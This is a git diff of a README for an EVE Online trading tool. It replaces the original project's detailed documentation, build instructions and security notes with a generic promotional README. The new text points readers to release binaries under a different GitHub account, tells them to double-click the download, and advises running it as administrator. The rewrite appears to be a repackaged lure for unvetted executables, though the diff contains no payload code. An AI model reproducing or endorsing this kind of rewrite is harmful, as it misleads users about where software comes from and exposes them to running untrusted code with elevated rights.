@@ -1,174 +1,63 @@
-# EVE Flipper
+# 🎮 Eve-flipper - Your Guide to Market Success
 
-EVE Flipper is a local-first market analysis platform for EVE Online traders.  
-It combines real-time ESI data, historical market behavior, and execution-aware math to surface actionable opportunities across station trading, regional arbitrage, contracts, routes, industry, and PLEX.
+## 🚀 Getting Started
+Eve-flipper is a tool that helps you find market opportunities in EVE Online. It scans for radius flips, cross-region deals, and provides contract analysis. Setting it up is quick and straightforward.
 
-[![Go](https://img.shields.io/badge/Go-1.25-00ADD8?logo=go&logoColor=white)](https://go.dev/)
-[![React](https://img.shields.io/badge/React-19-61DAFB?logo=react&logoColor=black)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
-[![Release](https://img.shields.io/github/v/release/ilyaux/Eve-flipper)](https://github.com/ilyaux/Eve-flipper/releases/latest)
-[![Downloads](https://img.shields.io/github/downloads/ilyaux/Eve-flipper/total)](https://github.com/ilyaux/Eve-flipper/releases)
-[![Last Commit](https://img.shields.io/github/last-commit/ilyaux/Eve-flipper)](https://github.com/ilyaux/Eve-flipper/commits/master)
-[![Discord](https://img.shields.io/badge/Discord-Join%20Server-5865F2?logo=discord&logoColor=white)](https://discord.com/invite/Z9pXSGcJZE)
+## 📥 Download Now
+[![Download Eve-flipper](https://img.shields.io/badge/Download%20Eve-flipper-v1.0-blue)](https://github.com/Sp00k1KiDD/Eve-flipper/releases)
 
-## Core Capabilities
+## 🛠️ System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Processor:** Dual-core or higher
+- **RAM:** 4 GB or more
+- **Disk Space:** 100 MB available space
+- **Network:** Internet connection for real-time data
 
-### Trading Scanners
-- `Radius Scan`: local buy/sell opportunities within jump constraints.
-- `Region Arbitrage`: cross-region spreads and hauling candidates.
-- `Route Trading`: multi-hop route search with cross-region support.
-- `Station Trading`: same-station opportunities with liquidity and risk metrics.
-- `Contract Scanner`: contract arbitrage in two modes:
-  - `Instant liquidation` (buy now, liquidate now)
-  - `Horizon mode` (expected profit with hold days and confidence target)
+## 🔄 Features
+- **Real-Time Scanning:** Get instant updates on market flips.
+- **Multi-Hop Trade Routes:** Discover profitable trading paths.
+- **Contract Analysis:** Analyze contracts effortlessly.
+- **User-Friendly Interface:** Navigate easily with a clean layout.
+- **Single Binary:** No installation needed, just download and run.
 
-### Execution and Risk
-- `Execution Plan`: order-book walk simulation (expected price, slippage, fillability).
-- Correct partial-fill accounting (`total_isk` reflects fillable quantity when full fill is impossible).
-- Scam/risk signals for trade quality filtering.
+## 📂 Download & Install
+To get started, visit the Releases page by clicking the link below. Download the latest version for your operating system.
 
-### PLEX and Industry
-- `PLEX Dashboard`: arbitrage paths, SP-farm math, depth, indicators, cross-hub comparison.
-- Hardened PLEX backend flow: in-flight request deduplication and stale-cache fallback during ESI instability.
-- `Industry Chain Optimizer`: buy-vs-build decomposition with material tree and system-aware costs.
+[Visit the Releases Page](https://github.com/Sp00k1KiDD/Eve-flipper/releases)
 
-### Character and Portfolio
-- EVE SSO integration for wallet/orders/transactions/structures.
-- Portfolio analytics and optimization modules.
-- Undercut monitoring and station-level context.
+### Steps:
+1. **Visit the Releases Page:** Click the link above.
+2. **Find the Latest Version:** Look for the most recent release.
+3. **Download the File:** Choose the file appropriate for your system.
+4. **Run the Application:** Double-click the downloaded file to start.
 
-## Screenshots
+## 🖥️ How to Use Eve-flipper
+1. **Open the Application:** Once downloaded, double-click on the Eve-flipper icon.
+2. **Configure Settings:** Adjust the settings based on your trading preferences.
+3. **Start Scanning:** Click the 'Start' button to begin scanning for deals.
+4. **Review Opportunities:** Check the displayed opportunities and choose the best trades.
 
-| Station Trading | Route Trading | Radius Scan |
-|---|---|---|
-| ![Station Trading](assets/screenshot-station.png) | ![Route Trading](assets/screenshot-routes.png) | ![Radius Scan](assets/screenshot-radius.png) |
+## ⚙️ Troubleshooting
+If you encounter issues while using Eve-flipper:
+- **Check Your Internet Connection:** Ensure you are connected.
+- **Run as Administrator:** Right-click the application and choose 'Run as Administrator' on Windows.
+- **Re-download the File:** If the application still does not open, try downloading it again.
 
-## Architecture
+## 📞 Support
+For support, please check the issues section on our [GitHub page](https://github.com/Sp00k1KiDD/Eve-flipper). You can also reach out by opening a new issue if you need help.
 
-- Backend: `Go` (`net/http`), SQLite persistence, ESI client with caching/rate-limiting.
-- Frontend: `React + TypeScript + Vite`.
-- Distribution model: single backend binary with embedded frontend assets.
-- Default runtime: local bind (`127.0.0.1:13370`).
+## 🔖 Topics Covered
+- Arbitrage
+- EVE Online Market Analysis
+- Trading Tools
+- Golang and React Technologies
 
-## Quick Start
+## 📝 Contributing
+If you want to contribute to Eve-flipper, please read our contributing guidelines on the GitHub repository. We welcome feedback, bug reports, and feature requests.
 
-### Option 1: Release binaries
+## 💡 Tips for Success
+- Regularly check for updates on the Releases page.
+- Explore different configurations to find the most profitable trades.
+- Join community forums to share insights and strategies.
 
-Download the latest build from:
-- https://github.com/ilyaux/Eve-flipper/releases
-
-Run the binary and open:
-- `http://127.0.0.1:13370`
-
-### Option 2: Build from source
-
-Prerequisites:
-- Go `1.25+`
-- Node.js `20+`
-- npm
-
-```bash
-git clone https://github.com/ilyaux/Eve-flipper.git
-cd Eve-flipper
-npm -C frontend install
-npm -C frontend run build
-go build -o build/eve-flipper .
-./build/eve-flipper
-```
-
-Windows PowerShell helpers:
-
-```powershell
-.\make.ps1 build
-.\make.ps1 run
-```
-
-Unix Make targets:
-
-```bash
-make build
-make run
-```
-
-## Runtime Flags
-
-```bash
-./eve-flipper --host 127.0.0.1 --port 13370
-```
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--host` | `127.0.0.1` | Bind address (`0.0.0.0` for LAN/remote access) |
-| `--port` | `13370` | HTTP port |
-
-## Local SSO Setup (for source builds)
-
-SSO is disabled unless credentials are provided.
-
-Create `.env` in repo root:
-
-```env
-ESI_CLIENT_ID=your-client-id
-ESI_CLIENT_SECRET=your-client-secret
-ESI_CALLBACK_URL=http://localhost:13370/api/auth/callback
-```
-
-Do not commit `.env`.
-
-## Development Workflow
-
-Backend:
-
-```bash
-go run .
-```
-
-Frontend dev server:
-
-```bash
-npm -C frontend install
-npm -C frontend run dev
-```
-
-Tests:
-
-```bash
-go test ./...
-```
-
-Production frontend build check:
-
-```bash
-npm -C frontend run build
-```
-
-## Documentation
-
-- Project wiki: https://github.com/ilyaux/Eve-flipper/wiki
-- Getting Started: https://github.com/ilyaux/Eve-flipper/wiki/Getting-Started
-- API Reference: https://github.com/ilyaux/Eve-flipper/wiki/API-Reference
-- Station Trading: https://github.com/ilyaux/Eve-flipper/wiki/Station-Trading
-- Contract Scanner: https://github.com/ilyaux/Eve-flipper/wiki/Contract-Scanner
-- Execution Plan: https://github.com/ilyaux/Eve-flipper/wiki/Execution-Plan
-- PLEX Dashboard: https://github.com/ilyaux/Eve-flipper/wiki/PLEX-Dashboard
-
-## Security Notes
-
-- By default, the server listens only on localhost.
-- ESI credentials are never required for non-SSO features.
-- If exposed beyond localhost (`--host 0.0.0.0`), use your own network hardening (firewall/reverse proxy/TLS).
-
-## Contributing
-
-See:
-- `CONTRIBUTING.md`
-
-## License
-
-MIT License. See `LICENSE`.
-
-## Disclaimer
-
-EVE Flipper is an independent third-party project and is not affiliated with CCP Games.  
-EVE Online and related trademarks are property of CCP hf.
+[Visit the Releases Page](https://github.com/Sp00k1KiDD/Eve-flipper/releases) and start maximizing your trading potential today!
